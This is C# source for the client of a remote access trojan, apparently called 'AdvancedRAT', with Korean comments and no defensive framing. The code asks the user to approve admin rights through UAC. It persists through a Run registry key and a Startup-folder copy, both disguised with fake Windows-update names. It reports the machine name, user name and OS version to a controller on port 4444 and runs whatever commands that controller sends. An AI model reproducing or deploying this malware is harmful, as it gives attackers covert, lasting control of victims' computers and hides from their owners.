using System;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using Newtonsoft.Json;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Security.Principal;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Linq;
using AdvancedRAT.Client.Handlers;

namespace AdvancedRAT.Client
{
    public class RATClient
    {
        private TcpClient client;
        private NetworkStream stream;
        private string serverIP;
        private int serverPort = 4444;
        private string clientId;
        
        private CommandHandler commandHandler;
        
        public RATClient()
        {
            clientId = GetMachineId();
            commandHandler = new CommandHandler();
            LoadServerConfig();
        }
        
        private void LoadServerConfig()
        {
            try
            {
                string configPath = Path.Combine(
                    Path.GetDirectoryName(Application.ExecutablePath), 
                    "server.config"
                );
                
                if (File.Exists(configPath))
                {
                    string[] lines = File.ReadAllLines(configPath);
                    foreach (string line in lines)
                    {
                        if (line.StartsWith("SERVER_IP="))
                        {
                            serverIP = line.Substring(10).Trim();
                        }
                        else if (line.StartsWith("SERVER_PORT="))
                        {
                            serverPort = int.Parse(line.Substring(12).Trim());
                        }
                    }
                }
                else
                {
                    // server.config 없으면 자동으로 게이트웨이 IP 찾기
                    serverIP = GetGatewayIP();
                    if (string.IsNullOrEmpty(serverIP))
                    {
                        serverIP = "127.0.0.1";  
                    }
                }
            }
            catch
            {
                // 설정 파일 읽기 실패 시 기본값
                serverIP = "127.0.0.1";  
            }
        }
        
        private string GetGatewayIP()
        {
            try
            {
                // 활성화된 네트워크 인터페이스에서 게이트웨이 IP 찾기
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up &&
                        ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        IPInterfaceProperties ipProps = ni.GetIPProperties();
                        foreach (GatewayIPAddressInformation gateway in ipProps.GatewayAddresses)
                        {
                            string gatewayIP = gateway.Address.ToString();
                            // IPv4만 사용
                            if (gatewayIP.Contains(".") && !gatewayIP.StartsWith("0."))
                            {
                                return gatewayIP;
                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }
        
        public async Task Start()
        {
            // 관리자 권한 확인 및 자동 상승
            if (!IsAdministrator())
            {
                RequestAdminPrivileges();
                return;
            }
            
            AddPersistence();
            
            while (true)
            {
                try
                {
                    await ConnectToServer();
                    await HandleCommunication();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                    await Task.Delay(5000);
                }
            }
        }
        
        private bool IsAdministrator()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }
        
        private void RequestAdminPrivileges()
        {
            try
            {
                ProcessStartInfo proc = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    WorkingDirectory = Environment.CurrentDirectory,
                    FileName = Application.ExecutablePath,
                    Verb = "runas"
                };
                
                Process.Start(proc);
                Environment.Exit(0);
            }
            catch
            {
                // UAC 거부 시 일반 권한으로 계속 실행
            }
        }
        
        private async Task ConnectToServer()
        {
            client = new TcpClient();
            await client.ConnectAsync(serverIP, serverPort);
            stream = client.GetStream();
            
            await SendMessage(new
            {
                type = "register",
                client_id = clientId,
                computer_name = Environment.MachineName,
                user_name = Environment.UserName,
                os_version = Environment.OSVersion.ToString()
            });
        }
        
        private async Task HandleCommunication()
        {
            byte[] buffer = new byte[8192];
            
            while (client.Connected)
            {
                try
                {
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                    if (bytesRead == 0) break;
                    
                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    var command = JsonConvert.DeserializeObject<dynamic>(message);
                    
                    var response = await commandHandler.Execute(command);
                    await SendMessage(response);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Communication error: {ex.Message}");
                    break;
                }
            }
        }
        
        private async Task SendMessage(object data)
        {
            string json = JsonConvert.SerializeObject(data);
            byte[] bytes = Encoding.UTF8.GetBytes(json);
            await stream.WriteAsync(bytes, 0, bytes.Length);
        }
        
        private void AddPersistence()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                RegistryKey key = Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("WindowsSecurityUpdate", exePath);
                key.Close();
                
                string startupPath = Environment.GetFolderPath(
                    Environment.SpecialFolder.Startup);
                string shortcutPath = Path.Combine(startupPath, "WindowsUpdate.lnk");
                
                if (!File.Exists(shortcutPath))
                {
                    File.Copy(exePath, shortcutPath, true);
                }
            }
            catch { }
        }
        
        private string GetMachineId()
        {
            return Environment.MachineName + "_" + Environment.UserName;
        }
    }
}
